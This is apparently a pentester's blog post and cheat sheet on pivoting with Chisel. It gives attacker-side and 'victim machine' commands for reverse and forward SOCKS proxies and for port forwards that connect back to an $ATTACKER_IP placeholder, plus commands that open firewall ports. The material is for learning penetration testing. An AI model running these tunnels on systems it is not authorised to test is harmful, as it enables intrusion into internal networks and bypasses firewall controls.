---
author: Charlie T
title: Forwarding and Proxying with Chisel
date: 2024-03-10
description: A post explaining different proxying and forwarding techniques with the Chisel tool
math: false
tags:
  - chisel
---
### Reverse SOCKS Proxy

>This connects back from a compromised server to a listener waiting on our attacking machine.

#### Attacker Machine

```bash
# This sets up a listener on a your chosen LISTEN_PORT
./chisel server -p $LISTEN_PORT --reverse &
```

#### Victim Machine

```bash
# This command connects back to the waiting listener on our attacking box, completing the proxy. We are using the ampersand symbol (&) to background the processes.
./chisel client $ATTACKER_IP:$LISTEN_PORT R:socks &
```

### Forward SOCKS Proxy

>Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections). That said, it's still well worth learning how to set up a forward proxy with chisel.

#### Attacker Machine

```bash
# In this command, PROXY_PORT is the port that will be opened for the proxy
# Ex: ./chisel client 172.16.0.10:8080 1337:socks would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.
./chisel client $TARGET_IP:$LISTEN_PORT $PROXY_PORT:socks &
```

#### Victim Machine

```bash
# Sets up a listener on your chosen LISTEN_PORT
./chisel server -p $LISTEN_PORT --socks5
```

### Remote Port Forward

>A remote port forward is when we connect back from a compromised target to create the forward.

#### Attacker Machine

``` bash
# Sets up a chisel listener for the compromised host to connect back to
./chisel server -p $LISTEN_PORT --reverse &
```

#### Victim Machine

```bash
# LOCAL_PORT is the port we wish to open on our own attacking machine to link with the desired target port
# You can keep adding more instances of R:port:target:port up to how many ports you need to forward over
./chisel client $ATTACKER_IP:$LISTEN_PORT R:$LOCAL_PORT:$TARGET_IP:$TARGET_PORT &
```

### Local Port Forward

>As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

#### Attacker Machine

```bash
./chisel client $LISTEN_IP:$LISTEN_PORT $LOCAL_PORT:$TARGET_IP:$TARGET_PORT
```

#### Victim Machine

```bash
./chisel server -p $LISTEN_PORT
```


### Firewall Allow

```
# CentOS
firewall-cmd --zone=public --add-port $PORT/tcp

# Windows
netsh advfirewall firewall add rule name="$NAME" dir=in action=
allow protocol=tcp localport=$PORT
```





